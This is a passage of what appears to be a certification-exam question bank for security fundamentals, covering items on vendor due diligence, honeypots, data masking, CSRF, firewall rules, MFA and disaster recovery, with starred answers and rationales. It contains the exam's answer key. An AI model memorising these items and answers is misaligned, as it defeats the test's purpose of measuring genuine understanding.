+    C. A distributed denial-of-service attack is saturating the node's network
+        why: A DDoS would show as network exhaustion or unresponsive services, not one local process consuming 800% CPU.
+    D. The node's disk is failing and causing high I/O wait
+        why: Disk problems show as I/O wait, not as a specific user-space process burning CPU cycles.
+TAKEAWAY: Unexplained resource consumption (CPU, cloud spend) is a malicious-activity indicator. Cryptominers are the common payload after container or cloud credential compromise.
+
+[b054] type=mc domain=5 obj=5.3 (Explain the processes associated with third-party risk assessment and management) cat=third
+Q: A bank is selecting a vendor to host its mobile banking backend. Before signing, the procurement team reviews the vendor's audited financial statements, checks references from similar customers, verifies its security certifications, and researches any regulatory actions against it. Which of the following BEST describes this activity?
+  * A. Due diligence in vendor selection
+        why: Investigating a prospective vendor's financial health, reputation, certifications, and legal history before committing is the definition of due diligence.
+    B. Right-to-audit exercise
+        why: A right-to-audit is a contractual power used after signing to inspect the vendor's controls; here no contract exists yet.
+    C. Vendor monitoring
+        why: Monitoring is the ongoing review of an existing vendor; this is pre-contract evaluation.
+    D. Supply chain analysis of the vendor's own suppliers
+        why: Supply chain analysis looks at the vendor's downstream providers; the activities described focus on the vendor itself.
+TAKEAWAY: Due diligence happens before the contract; right-to-audit and monitoring happen after. Conflict-of-interest checks belong to the selection stage too.
+
+[b055] type=mc domain=1 obj=1.2 (Summarize fundamental security concepts) cat=controls
+Q: A plant's security team wants early warning if an attacker reaches the OT network. They deploy a device that answers on Modbus and looks like a real PLC but controls nothing, with any connection to it generating an alert. Which of the following BEST describes this deployment?
+  * A. A honeypot
+        why: A single decoy system that imitates a real asset to attract and reveal attackers is a honeypot; because no legitimate process should ever touch it, any contact is a high-fidelity alert.
+    B. A honeynet
+        why: A honeynet is an entire decoy network of multiple systems; this is one device.
+    C. A honeytoken
+        why: A honeytoken is a piece of fake data such as a bogus credential or record; the plant deployed a fake system, not fake data.
+    D. A honeyfile
+        why: A honeyfile is a decoy document placed on a share to detect access; a network-listening fake PLC is a system-level decoy.
+TAKEAWAY: Honeypot = one decoy system; honeynet = a decoy network; honeyfile = decoy document; honeytoken = decoy data such as a fake credential or API key.
+
+[b056] type=mc domain=3 obj=3.3 (Compare and contrast concepts and strategies to protect data) cat=data
+Q: A bank's developers need a realistic copy of the production customer database for testing, but policy prohibits real account numbers and names in non-production environments. The tests require that account numbers still pass format validation and that referential links between tables remain intact. Which of the following should be used?
+  * A. Data masking that replaces sensitive fields with consistent, format-preserving substitute values
+        why: Masking irreversibly swaps real values for realistic fakes while preserving format and consistency across tables, which keeps the test data usable without exposing real customers.
+    B. Encrypting the copy with a key held only by the DBA
+        why: Encrypted fields would fail format validation, and the moment a developer needs to read them the real data is exposed.
+    C. Hashing each account number with SHA-256
+        why: Hashes are fixed-length hex strings that will not pass account number format checks, and unsalted hashes of short numbers can be reversed.
+    D. Granting developers read-only access to production instead
+        why: Read-only access still exposes real customer data to developers, which the policy forbids.
+TAKEAWAY: Masking (static, for non-prod copies) removes real values while keeping data realistic. Tokenization keeps a reversible vault; encryption is reversible with the key.
+
+[b057] type=mc domain=4 obj=4.7 (Explain the importance of automation and orchestration related to secure operations) cat=ops
+Q: A startup's engineers frequently deploy cloud storage with public read access by mistake. The security team wants deployments that contain such a setting to be rejected automatically in the pipeline before anything is created, without a human review of every change. Which of the following automation use cases does this describe?
+  * A. Guard rails enforced in the CI/CD pipeline
+        why: Guard rails are automated policy checks that block non-compliant infrastructure definitions before deployment, letting engineers move fast within safe boundaries.
+    B. Automated ticket creation for each public bucket
+        why: Ticketing records the problem after it already exists; the requirement is to prevent creation in the first place.
+    C. User provisioning through the identity provider
+        why: User provisioning automates account lifecycle; it is unrelated to storage configuration.
+    D. Escalation of alerts to the on-call engineer
+        why: Escalation routes an existing alert to a person; again this happens after the misconfiguration is live.
+TAKEAWAY: Guard rails = automated preventive policy enforcement in pipelines and cloud accounts. They scale security review without adding manual gates.
+
+[b058] type=mc domain=2 obj=2.2 (Explain common threat vectors and attack surfaces) cat=vulns
+Q: A plant's HMI vendor pushes a routine software update through its normal update server. Days later, several HMIs begin sending screenshots to an external host. Investigation shows the update was correctly signed with the vendor's certificate, whose private key had been stolen from the vendor's build system. Which of the following BEST describes the vulnerability?
+  * A. Malicious update delivered through a compromised software supply chain
+        why: The attacker did not exploit the HMIs directly; they compromised the vendor's build and signing process so the trusted update mechanism delivered malware.
+    B. Side loading of unapproved applications on the HMIs
+        why: Side loading is installing software outside the official channel; this malware arrived through the official, signed channel.
+    C. Cryptographic vulnerability due to a weak signing algorithm
+        why: The algorithm was not broken; the key was stolen. Signature validation worked exactly as designed on a maliciously signed package.
+    D. Firmware end-of-life on the HMI hardware
+        why: The hardware was fully supported and receiving updates; that update channel was the attack path.
+TAKEAWAY: A valid signature proves the signer's key was used, not that the signer was honest or uncompromised. Supply chain defenses include SBOMs, vendor assessment, and monitoring post-update behavior.
+
+[b059] type=mc domain=5 obj=5.4 (Summarize elements of effective security compliance) cat=gov
+Q: A startup provides spending-insight analytics to a bank, processing the bank's customer transaction data strictly according to the bank's instructions. A bank customer emails the startup demanding that all data about them be erased. Which of the following is the startup's correct action?
+  * A. Refer the request to the bank, because as the processor it acts only on the controller's instructions
+        why: The bank decides the purposes of processing and is the controller; data subject requests are the controller's to evaluate. The processor supports the response but must not act unilaterally.
+    B. Delete the customer's data immediately to honor the right to be forgotten
+        why: The startup has no authority to decide the request; erasure may conflict with the bank's legal retention duties, and unilateral deletion breaches the processing agreement.
+    C. Ignore the request because the startup has no direct relationship with the customer
+        why: Processors cannot ignore data subject requests; they are obligated to pass them to the controller promptly.
+    D. Ask the customer to prove identity and then erase the data
+        why: Identity verification is part of handling a request, but the decision to erase still belongs to the controller, not the processor.
+TAKEAWAY: Data subject rights are exercised against the controller. A processor forwards the request and assists; it does not decide.
+
+[b060] type=mc domain=4 obj=4.6 (Given a scenario, implement and maintain identity and access management) cat=iam
+Q: A contractor's engagement at a plant ended two months ago, but the contractor's VPN account and badge remained active and were later used by an unknown party. HR recorded the departure on the last day. Which of the following would have MOST effectively prevented this?
+  * A. Automated de-provisioning triggered by the HR system's termination record
+        why: Linking account and badge disablement to the authoritative HR event removes the dependency on someone remembering to file a ticket, closing the window on the day access should end.
+    B. Quarterly access recertification by the contractor's manager
+        why: Recertification is a valuable detective control but could leave a dormant account active for up to three months, which is what happened here.
+    C. Requiring the contractor to change the VPN password before leaving
+        why: An active account with a fresh password is still an active account; the problem is that access existed at all after the engagement ended.
+    D. Enforcing a stricter password complexity standard
+        why: Complexity does not matter when the account should not exist; the misuse was of a legitimate, un-revoked credential.
+TAKEAWAY: Offboarding must be event-driven: HR termination automatically disables accounts, tokens, and badges the same day. Periodic reviews catch what automation misses.
+
+[b061] type=mc domain=3 obj=3.4 (Explain the importance of resilience and recovery in security architecture) cat=arch
+Q: A bank's core ledger database must keep accepting writes if the server hosting it fails, with the standby taking over the same storage and IP address within seconds and no transactions lost. Which of the following high-availability approaches BEST fits this requirement?
+  * A. A failover cluster with shared storage and a virtual IP
+        why: Clustering provides an active/passive pair that shares state; when the active node dies the passive node mounts the same data and adopts the virtual IP, preserving committed transactions.
+    B. A load balancer distributing writes across two independent database servers
+        why: Load balancing spreads stateless requests; two independent databases receiving different writes would diverge and corrupt the ledger.
+    C. Nightly replication to a warm site
+        why: A warm site with nightly copies means hours of downtime and up to a day of lost transactions, far from seconds and zero loss.
+    D. A content delivery network in front of the database
+        why: CDNs cache static content near users; they have no role in database write availability.
+TAKEAWAY: Load balancing = spread stateless work across many nodes. Clustering = nodes share state so one can take over the other's role. Stateful databases need clustering.
+
+[b062] type=mc domain=2 obj=2.2 (Explain common threat vectors and attack surfaces) cat=social
+Q: Customers of a neobank start receiving replies on a social media platform from an account using the bank's logo and a nearly identical handle, offering to 'verify' their accounts through a link that harvests credentials. Which of the following BEST describes this technique?
+  * A. Brand impersonation
+        why: The attacker copies the bank's visual identity and name to appear to be the bank's official support channel, exploiting customer trust in the brand.
+    B. Typosquatting
+        why: Typosquatting registers misspelled domain names to catch mistyped URLs; this attack lives on a social platform and relies on the logo and handle, not a mistyped domain.
+    C. Pretexting
+        why: Pretexting builds a fabricated story to justify a request; the lure here is the fake brand identity itself rather than an invented situation.
+    D. Disinformation campaign
+        why: Disinformation spreads false narratives to influence opinion; this attack's goal is direct credential theft.
+TAKEAWAY: Brand impersonation borrows a trusted organization's identity (logo, name, style) on any channel. Typosquatting is specifically about lookalike domain names.
+
+[b063] type=mc domain=4 obj=4.3 (Explain various activities associated with vulnerability management) cat=ops
+Q: A bank's threat intelligence team wants timely, sector-specific indicators and early warnings about campaigns targeting financial institutions, shared confidentially by peer organizations and coordinated with regulators. Which of the following sources BEST meets this need?
+  * A. A financial sector information sharing and analysis center
+        why: ISACs are sector-specific communities where member organizations and government partners share indicators, tactics, and early warnings relevant to that industry under trusted terms.
+    B. Open-source intelligence from public blogs and social media
+        why: OSINT is broad and free but is neither sector-curated nor confidential; peer banks would not share sensitive incident details publicly.
+    C. Dark web monitoring for leaked credentials
+        why: Dark web feeds reveal stolen data and chatter but do not provide coordinated peer and regulator warnings about active campaigns.
+    D. The vendor's proprietary vulnerability feed
+        why: Vendor feeds cover product flaws generally; they are not built around confidential sharing among financial peers.
+TAKEAWAY: Threat feeds: OSINT (public), proprietary (vendor), ISAC (sector peers plus government), dark web (criminal ecosystem). ISACs give sector context.
+
+[b064] type=mc domain=5 obj=5.5 (Explain types and purposes of audits and assessments) cat=third
+Q: A startup hires a firm to test its customer API. The testers are given API documentation and a standard customer account but no source code, no infrastructure diagrams, and no internal credentials. Which of the following BEST describes this engagement?
+  * A. A partially known environment test
+        why: The testers have some insider knowledge (documentation and a normal account) but not full access, placing the test between unknown and known environment approaches.
+    B. An unknown environment test
+        why: Unknown environment testing starts with no information beyond a target name; here documentation and an account were provided.
+    C. A known environment test
+        why: Known environment testing gives full internal detail such as source code, architecture, and admin credentials, which were withheld.
+    D. A defensive penetration test
+        why: Defensive testing evaluates the blue team's detection and response; this engagement is offensive testing of the API's security.
+TAKEAWAY: Unknown = no info (simulates outsider); partially known = some info (simulates a user or partner); known = full info (deepest coverage).
+
+[b065] type=mc domain=1 obj=1.4 (Explain the importance of using appropriate cryptographic solutions) cat=crypto
+Q: A bank has two needs: full-disk encryption keys on 3,000 employee laptops must be released only when the laptop boots with unmodified firmware and bootloader, and the certificate authority's root signing key must be generated and used inside tamper-resistant hardware that never exposes it. Which of the following pairs is correct?
+  * A. TPM for the laptops; HSM for the CA root key
+        why: A TPM is a per-device chip that measures boot integrity and seals keys to it, ideal for disk encryption. An HSM is a dedicated appliance for high-value keys like a CA root, with tamper resistance and audited use.
+    B. HSM for the laptops; TPM for the CA root key
+        why: Deploying an HSM to every laptop is impractical and unnecessary, and a single TPM chip lacks the throughput, redundancy, and audit features expected of a CA's key store.
+    C. Key management service for both
+        why: A cloud KMS manages keys centrally but cannot measure a laptop's boot state, and the bank wants the root key generated in on-premises tamper-resistant hardware.
+    D. Secure enclave for both
+        why: A secure enclave isolates processing within a CPU on a device; it does not serve as the shared, hardened key store an enterprise CA requires.
+TAKEAWAY: TPM = built-in chip per device (boot measurement, disk encryption keys). HSM = network or PCIe appliance for enterprise-critical keys (CA, payment). KMS = central key lifecycle.
+
+[b066] type=mc domain=2 obj=2.4 (Given a scenario, analyze indicators of malicious activity) cat=attacks
+Q: A startup's application log shows the request below. The user whose session cookie appears did not intend to change anything and was reading an unrelated blog at the time. Which of the following attacks is indicated?
+EXHIBIT:
+    POST /account/email HTTP/1.1
+    Host: app.example
+    Referer: https://free-recipes.example/post/77
+    Cookie: session=8a1f...
+    new_email=attacker@203-0-113-5.example
+  * A. Cross-site request forgery
+        why: The request carries the victim's real session cookie but originated from a third-party page, meaning that page tricked the browser into submitting a state-changing form on the victim's behalf.
+    B. Stored cross-site scripting
+        why: XSS would show script content injected into the application; this is a legitimately formed request from another origin using the browser's ambient credentials.
+    C. Session hijacking via cookie theft
+        why: With hijacking, the attacker would send requests from their own machine; here the victim's own browser sent it, as the Referer shows.
+    D. SQL injection in the email field
+        why: The new_email value is a plain address with no query syntax; the attack is in who caused the request, not in its content.
+TAKEAWAY: CSRF = victim's browser forced to send an authenticated request from another site. Defend with anti-forgery tokens and SameSite cookies.
+
+[b067] type=mc domain=4 obj=4.1 (Given a scenario, apply common security techniques to computing resources) cat=harden
+Q: A plant is replacing its floor Wi-Fi, which currently uses one shared passphrase that every contractor knows. The new design must authenticate each device with its own credential or certificate against the central directory, and use the strongest available encryption. Which of the following should be deployed?
+  * A. WPA3-Enterprise with 802.1X authentication against a RADIUS server
+        why: Enterprise mode replaces the shared passphrase with per-user or per-device EAP authentication via RADIUS tied to the directory, and WPA3 provides the current strongest encryption.
+    B. WPA3-Personal with a longer passphrase
+        why: Personal mode still uses one shared secret for everyone, so a departing contractor keeps working access and there is no per-device identity.
+    C. WPA2-Enterprise with a hidden SSID
+        why: Enterprise authentication is right, but WPA2 is not the strongest available and hiding the SSID adds no real security.
+    D. An open network with MAC address filtering
+        why: Open networks have no encryption and MAC addresses are trivially spoofed.
+TAKEAWAY: Personal = shared PSK; Enterprise = 802.1X/EAP with RADIUS and individual credentials. Use WPA3 wherever clients support it.
+
+[b068] type=mc domain=3 obj=3.4 (Explain the importance of resilience and recovery in security architecture) cat=data
+Q: A trading firm's business impact analysis sets a recovery time objective of 15 minutes for its order-matching system. The firm is choosing a disaster recovery site. Which of the following site types is the ONLY one that can realistically meet this objective?
+  * A. A hot site with systems running and data replicated continuously
+        why: Only a hot site keeps duplicate systems live with near-real-time data, allowing failover in minutes. Any site that must be provisioned or restored cannot achieve 15 minutes.
+    B. A warm site with hardware installed and data restored from nightly backups
+        why: Restoring from backups and bringing systems up takes hours, and the nightly copies would also miss the firm's likely RPO.
+    C. A cold site with power, cooling, and rack space
+        why: A cold site has no equipment; procuring and installing systems takes days or weeks.
+    D. A geographically dispersed cold site in a different region
+        why: Geographic dispersion helps survive regional disasters, but a cold site is still empty space and cannot meet a 15-minute RTO.
+TAKEAWAY: Hot = minutes (highest cost); warm = hours to a day; cold = days or weeks. The RTO drives the site choice.
+
+[b069] type=mc domain=5 obj=5.4 (Summarize elements of effective security compliance) cat=gov
+Q: After repeated failures to protect customer data, a regulator revokes a brokerage's authorization to operate in a particular jurisdiction until it can demonstrate remediation. Which of the following consequences of non-compliance has occurred?
+  * A. Loss of license
+        why: The regulator withdrew the brokerage's permission to conduct business, which is the loss-of-license consequence and one of the most severe outcomes of non-compliance.
+    B. Fines
+        why: A fine is a monetary penalty; the brokerage was not charged money but stopped from operating.
+    C. Contractual impacts
+        why: Contractual impacts arise when a customer or partner invokes penalty or termination clauses; this action came from the regulator, not a counterparty.
+    D. Reputational damage
+        why: Reputational harm will likely follow, but the specific consequence described is a regulatory action that halts operations.
+TAKEAWAY: Non-compliance consequences: fines, sanctions, reputational damage, loss of license, and contractual impacts. Identify which one the scenario actually describes.
+
+[b070] type=mc domain=4 obj=4.9 (Given a scenario, use data sources to support an investigation) cat=ops
+Q: A plant SOC suspects the historian server pushed several gigabytes to an external host overnight. The firewall log shows the connections were allowed but records no byte counts, full packet capture is not retained, and the SIEM ingests only authentication events. Which data source would BEST quantify how much data left and when?
+  * A. NetFlow/IPFIX records from the core router, which keep per-connection metadata including bytes transferred
+        why: Flow records are network metadata: source, destination, ports, start/end times and byte counts for every conversation, retained far longer than packet captures. They answer 'how much, to where, when'.
+    B. The historian's most recent vulnerability scan report
+        why: A scan describes weaknesses that might have been exploited; it contains nothing about traffic volume or timing.
+    C. The antivirus log on the historian
+        why: Antivirus records detections, not network transfer sizes, and a tool that missed the activity has nothing to show.
+    D. A SIEM dashboard of failed logins for the plant
+        why: The SIEM only holds authentication events here; failed logins say nothing about data leaving the network.
+TAKEAWAY: When packet captures are not available, flow data (NetFlow/IPFIX/sFlow) is the metadata source for volumes, endpoints and timing. Firewall logs show allow/deny; flows show how much.
+
+[b071] type=ms domain=2 obj=2.3 (Explain various types of vulnerabilities) cat=vulns
+Q: A plant issues tablets to maintenance technicians for viewing equipment manuals. An audit finds several tablets have been jailbroken and have apps installed from package files downloaded off the internet. Which TWO of the following are direct security consequences of these findings?
+(choose 2)
+  * A. Side-loaded packages bypass the app store's review and signing, so malware can be installed
+        why: Installing from arbitrary package files skips the vetting and signature checks that official stores provide, which is the core risk of side loading.
+  * B. Jailbreaking removes OS protections, allowing apps to escalate privileges and defeat MDM controls
+        why: A jailbroken device gives apps root-level access, so sandboxing, encryption enforcement, and MDM policies can be bypassed or disabled.
+    C. The tablets will no longer be able to connect to Wi-Fi
+        why: Connectivity is unaffected; that is precisely why compromised tablets remain a risk to the network.
+    D. The tablets' batteries will fail because of unsigned code
+        why: Code signing status has no relationship to battery hardware.
+    E. The manuals stored on the tablets become encrypted by the OS
+        why: Jailbreaking weakens rather than adds encryption; it does not lock the user's own files.
+TAKEAWAY: Mobile device vulns: side loading (unvetted apps) and jailbreaking/rooting (OS protections removed). MDM should detect both and block access.
+
+[b072] type=mc domain=3 obj=3.1 (Compare and contrast security implications of different architecture models) cat=arch
+Q: A plant's safety controllers run a real-time operating system that must respond to sensor input within two milliseconds. The security team proposes installing an endpoint agent and enabling automatic patching on them. Which of the following is the BEST reason the OT engineers reject this?
+  * A. An RTOS needs deterministic timing; agents and unscheduled patches add latency or reboots that break safety limits
+        why: Real-time and embedded systems prioritize predictable responsiveness; unplanned CPU load or restarts can miss timing deadlines with physical consequences. Controls should be network-based and changes scheduled.
+    B. Safety controllers never have vulnerabilities
+        why: Embedded and RTOS devices frequently have vulnerabilities; the issue is how to mitigate them without harming determinism, not whether they exist.
+    C. Endpoint agents are only licensed for desktop operating systems
+        why: Licensing is not the concern; the architectural constraints of a real-time system are.
+    D. Patching is unnecessary because the controllers are air-gapped
+        why: The scenario does not state the controllers are air-gapped, and isolation is a compensating control rather than a reason vulnerabilities do not matter.
+TAKEAWAY: RTOS/embedded considerations: responsiveness, inability to patch on demand, limited compute. Protect with segmentation, monitoring, and scheduled vendor-approved updates.
+
+[b073] type=mc domain=4 obj=4.4 (Explain security alerting and monitoring concepts and tools) cat=ops
+Q: A bank's DLP system is tuned to block outbound emails containing account numbers. An audit discovers that a spreadsheet of account numbers was emailed to a personal address last month with no alert generated, because the numbers were formatted with spaces the DLP pattern did not expect. Which of the following BEST describes this outcome?
+  * A. A false negative
+        why: The control failed to flag a genuine policy violation; a real event went undetected, which is the definition of a false negative and the more dangerous error type.
+    B. A false positive
+        why: A false positive is an alert on benign activity; here no alert fired at all on malicious activity.
+    C. Alert fatigue
+        why: Alert fatigue is analysts ignoring excessive alerts; in this case there was no alert to ignore.
+    D. A true negative
+        why: A true negative is correctly not alerting on benign traffic; this traffic violated policy and should have been blocked.
+TAKEAWAY: False positive = alert on nothing; false negative = silence on something real. Validate DLP patterns against real data formats and tune regularly.
+
+[b074] type=ms domain=5 obj=5.3 (Explain the processes associated with third-party risk assessment and management) cat=third
+Q: A startup already has a master service agreement with a consulting firm. It now wants that firm to conduct a six-week review of its cloud architecture, during which the consultants will see unreleased product designs. Which TWO documents are needed for this specific engagement?
+(choose 2)
+  * A. A statement of work defining the review's scope, deliverables, timeline, and fees
+        why: The SOW is the per-engagement document that operates under the existing MSA and specifies exactly what this six-week review will produce.
+  * B. A non-disclosure agreement covering the unreleased product designs
+        why: Because the consultants will see confidential designs, an NDA (or confirmation that the MSA's confidentiality terms cover this material) is required.
+    C. A new master service agreement
+        why: An MSA already exists; its terms govern this engagement, so another is redundant.
+    D. A memorandum of understanding between the two companies
+        why: An MOU expresses non-binding intent; the parties already have a binding contractual relationship.
+    E. A business partners agreement
+        why: A BPA is for joint ventures with shared profits; this is a paid consulting service.
+TAKEAWAY: MSA once, SOW per project, NDA whenever confidential information changes hands. SLA if measurable service levels apply.
+
+[b075] type=ms domain=1 obj=1.3 (Explain the importance of change management processes and the impact to security) cat=controls
+Q: A plant plans to upgrade the firmware on its production line PLCs. The change request notes the upgrade will require restarting the line's supervisory server, which other lines' dashboards also depend on. Which TWO change management elements MOST directly address these facts?
+(choose 2)
+  * A. Impact analysis documenting the dependency of other lines' dashboards on the server
+        why: Impact analysis identifies what else is affected by the change; the shared dependency is exactly the kind of consequence it must capture.
+  * B. A maintenance window scheduled when the restart causes the least production disruption
+        why: Because the change forces a service restart and downtime, it must be scheduled in an approved window agreed with the affected stakeholders.
+    C. Updating the acceptable use policy for plant operators
+        why: The AUP governs user behavior; it has nothing to do with scheduling a firmware upgrade.
+    D. Adding the PLC vendor to the approved vendor list
+        why: Vendor approval is a procurement matter and does not address the restart or the dependency.
+    E. Disabling the honeypot on the OT network during the upgrade
+        why: A honeypot is unrelated to the change and should remain in place to detect misuse of the maintenance window.
+TAKEAWAY: Change management: approval, ownership, stakeholders, impact analysis, test results, backout plan, maintenance window, SOP. Restarts and dependencies are 'technical implications' to plan for.
+
+[b076] type=mc domain=2 obj=2.1 (Compare and contrast common threat actors and motivations) cat=actors
+Q: A bank's systems are encrypted by a group that also copied customer records and threatens to publish them on a leak site unless a cryptocurrency payment is made. The group operates a support chat and a public affiliate program. Which of the following BEST describes the actor and motivation?
+  * A. Organized crime motivated by financial gain
+        why: Double extortion (encrypt plus threaten to leak), affiliate programs, and professional 'customer support' are hallmarks of ransomware-as-a-service run by organized criminal groups for profit.
+    B. Nation-state actor motivated by espionage
+        why: State actors seeking intelligence stay hidden; publicly extorting for cryptocurrency and running an affiliate program is a commercial operation.
+    C. Hacktivist motivated by political beliefs
+        why: Hacktivists publish data to make a point; they do not typically offer to withhold it in exchange for payment.
+    D. Insider threat motivated by revenge
+        why: A public affiliate program and a leak site indicate an external criminal enterprise, not a single disgruntled employee.
+TAKEAWAY: Organized crime = financially motivated, well resourced, businesslike (RaaS, affiliates, negotiation portals). Double extortion adds blackmail to service disruption.
+
+[b077] type=mc domain=4 obj=4.6 (Given a scenario, implement and maintain identity and access management) cat=iam
+Q: A brokerage requires traders to log in by inserting a hardware security key and entering a PIN on the keypad of that same key. A new analyst argues this is not true multifactor authentication because it is a single device. Which of the following is the BEST response?
+  * A. It is MFA because the key is something you have and the PIN is something you know
+        why: Factors are defined by their nature, not by their packaging. Possessing the key and knowing the PIN are two independent factor types, so the login is multifactor.
+    B. It is not MFA because both factors are entered on the same device
+        why: Using one device does not merge the factors; an attacker who steals the key still lacks the PIN, and one who learns the PIN still lacks the key.
+    C. It is not MFA because a PIN is weaker than a password
+        why: PIN strength affects the quality of the knowledge factor, not whether it is a distinct factor.
+    D. It is MFA only if a fingerprint is also required
+        why: Adding a biometric would make it three factors, but two are sufficient for multifactor.
+TAKEAWAY: Something you know (PIN, password), have (key, token, phone), are (biometric), somewhere you are (location). MFA needs two different types, regardless of form factor.
+
+[b078] type=mc domain=2 obj=2.3 (Explain various types of vulnerabilities) cat=vulns
+Q: A startup discovers that a cloud storage bucket holding customer identity documents was readable by anyone on the internet for eight months. The bucket was created by an engineer who accepted the provider's default settings at the time and never revisited them. Which of the following BEST describes the vulnerability?
+  * A. A cloud-specific misconfiguration
+        why: Cloud storage permissions are entirely the customer's responsibility; leaving access settings wider than intended is a misconfiguration class specific to cloud services and one of the most common causes of breaches.
+    B. A zero-day in the storage service
+        why: No flaw in the provider's software was exploited; the service worked exactly as configured.
+    C. VM escape from a neighboring tenant
+        why: No hypervisor boundary was crossed; the data was simply published to the internet by its permissions.
+    D. A cryptographic vulnerability in the bucket's encryption
+        why: Encryption at rest does not help when the service itself authorizes anonymous reads and decrypts on delivery.
+TAKEAWAY: Cloud-specific vulnerabilities are usually misconfigurations: public storage, over-permissive roles, exposed management interfaces. Use guard rails and configuration scanning.
+
+[b079] type=mc domain=5 obj=5.2 (Explain elements of the risk management process) cat=gov
+Q: A plant's business impact analysis lists a robotic welder with a mean time between failures of 4,000 hours and a mean time to repair of 6 hours. The maintenance manager asks what the MTTR figure tells them. Which of the following is the BEST answer?
+  * A. On average, restoring the welder to service after a failure takes about six hours
+        why: MTTR measures the average duration of repair once something breaks, which is a key input to how much downtime each failure contributes and whether the RTO can be met.
+    B. The welder is expected to fail about every six hours
+        why: Failure frequency is described by MTBF (4,000 hours), not MTTR.
+    C. The welder can be down for at most six hours before production losses become unacceptable
+        why: That describes the RTO, a business tolerance, not the measured repair time.
+    D. The welder loses six hours of production data on each failure
+        why: Data loss tolerance is the RPO; MTTR is about repair duration, not data.
+TAKEAWAY: MTBF = how often it breaks; MTTR = how long it takes to fix; RTO = how long you can tolerate; RPO = how much data you can lose.
+
+[b080] type=mc domain=4 obj=4.5 (Given a scenario, modify enterprise capabilities to enhance security) cat=ops
+Q: A plant's firewall between the corporate network (10.10.0.0/16) and the OT DMZ (10.20.5.0/24) has the rule set below. During a review, an engineer notices that a corporate workstation was able to open a remote desktop session to the historian at 10.20.5.9. Which of the following rules allowed this?
+EXHIBIT:
+    #  ACTION  SRC              DST             PORT    NOTE
+    1  ALLOW   10.10.7.5        10.20.5.9       3389    Admin jump host RDP
+    2  ALLOW   10.10.0.0/16     10.20.5.9       443     Dashboard
+    3  ALLOW   10.10.0.0/16     10.20.5.0/24    ANY     Temp - troubleshooting
+    4  DENY    ANY              10.20.5.0/24    ANY     Default deny
+  * A. Rule 3, because it permits any port from the entire corporate network into the whole OT DMZ
+        why: Rule 3 is a wide-open 'temporary' allow that was never removed; it matches RDP from any corporate host before the default deny is reached.
+    B. Rule 1, because it allows RDP to the historian
+        why: Rule 1 permits RDP only from the specific jump host 10.10.7.5, which is intended; a general workstation would not match its source.
+    C. Rule 2, because port 443 can tunnel RDP
+        why: Rule 2 only allows HTTPS to the historian; a plain RDP session on 3389 does not match it.
+    D. Rule 4, because the default deny is in the wrong position
+        why: The default deny is correctly last; the problem is the overly broad allow above it, not the deny's placement.
+TAKEAWAY: Firewalls process rules top-down, first match wins. 'Temporary' any/any rules are a classic misconfiguration; review rule sets regularly and expire exceptions.
+
+[b081] type=mc domain=2 obj=2.4 (Given a scenario, analyze indicators of malicious activity) cat=attacks
+Q: A plant's PLC vendor verifies firmware integrity by comparing an MD5 digest published on its website. Researchers demonstrate that they can craft two different firmware images, one benign and one malicious, that produce the same MD5 digest, so a digest check cannot tell them apart. Which of the following attacks does this demonstrate?
+  * A. Hash collision attack
+        why: Two different inputs producing the same digest is a collision; MD5 is broken in this respect, so a digest match no longer proves the firmware is authentic.
+    B. Downgrade attack
+        why: A downgrade forces the use of a weaker protocol version during negotiation; here no protocol was negotiated, the hash algorithm itself was defeated.
+    C. Replay attack
+        why: Replay reuses a captured valid message; the researchers created new malicious content, not a copy of old traffic.
+    D. Pass-the-hash attack
+        why: Pass-the-hash reuses a stolen password hash to authenticate; it has nothing to do with file integrity checks.
+TAKEAWAY: Collision = two inputs, one hash. MD5 and SHA-1 are collision-broken; use SHA-256 and, better, digital signatures for firmware.
+
+[b082] type=mc domain=4 obj=4.8 (Explain appropriate incident response activities) cat=ir
+Q: A bank's forensics team images the disk of a compromised server before analysis. Months later, defense counsel argues the image analyzed in court could have been altered after acquisition. Which of the following should the team have recorded at acquisition time to refute this claim?
+  * A. A cryptographic hash of the image, verified against the original and re-verified before analysis
+        why: Recording SHA-256 digests at acquisition and confirming they still match later proves the evidence is bit-for-bit unchanged, supporting both integrity and the chain of custody.
+    B. The CVSS score of the vulnerability exploited on the server
+        why: A severity score describes the vulnerability; it says nothing about whether the evidence copy was modified.
+    C. A screenshot of the server's login page
+        why: A screenshot is not a verifiable representation of disk contents and cannot prove the image was unaltered.
+    D. The server's uptime at the moment of imaging
+        why: Uptime is useful context but has no bearing on the integrity of the acquired image.
+TAKEAWAY: Forensic integrity: hash at acquisition, work on copies, re-hash before analysis and presentation, and log every handoff in the chain of custody.
+
+[b083] type=mc domain=5 obj=5.6 (Given a scenario, implement security awareness practices) cat=third
+Q: A plant's awareness program teaches staff to notice and report a coworker who starts working unusual hours, copies large volumes of engineering files, and reacts angrily when asked about it, and provides a confidential reporting channel. Which of the following awareness topics does this MOST directly address?
+  * A. Insider threat and anomalous behavior recognition
+        why: Training staff to spot behavioral warning signs in colleagues and report them safely is the insider-threat component of security awareness.
+    B. Phishing recognition
+        why: Phishing training concerns identifying deceptive messages; this scenario involves a person's on-site behavior, not email.
+    C. Removable media handling
+        why: Media policy covers how USB devices may be used; the training here is about recognizing a risky individual regardless of medium.
+    D. Hybrid and remote work security
+        why: Remote-work guidance covers home networks and devices; the concern is an on-site employee's conduct.
+TAKEAWAY: Awareness programs include phishing, social engineering, password hygiene, removable media, remote work, and insider threat with anomalous behavior recognition and reporting.
+
+[b084] type=mc domain=3 obj=3.4 (Explain the importance of resilience and recovery in security architecture) cat=data
+Q: A bank wants to validate that its disaster recovery site can process a full day of real transactions correctly, but regulators forbid any interruption to the production system during the test. Which of the following testing methods should be used?
+  * A. Parallel processing, running the recovery site alongside production on the same inputs and comparing results
+        why: Parallel processing exercises the recovery systems with real workload while production continues untouched; output comparison proves the site would produce correct results.
+    B. A failover test that switches production to the recovery site
+        why: Failover proves the switch works, but it interrupts production, which the regulators prohibited.
+    C. A tabletop exercise walking through the DR plan
+        why: A tabletop is discussion only; it cannot validate that the site actually processes transactions correctly.
+    D. A simulation in which staff practice restoring from backups to a lab
+        why: A lab restore checks procedures and backups but does not demonstrate the real recovery site handling a real day's transactions.
+TAKEAWAY: Resilience tests: tabletop (talk), simulation (practice), parallel processing (run both, compare), failover (actually switch). Choose based on assurance needed versus disruption allowed.
+
+[b085] type=mc domain=4 obj=4.1 (Given a scenario, apply common security techniques to computing resources) cat=harden
+Q: A startup wants to catch injection flaws and hardcoded secrets in its own source code every time a developer opens a pull request, before the application is ever built or deployed. Which of the following BEST meets this need?
+  * A. Static code analysis integrated into the CI pipeline
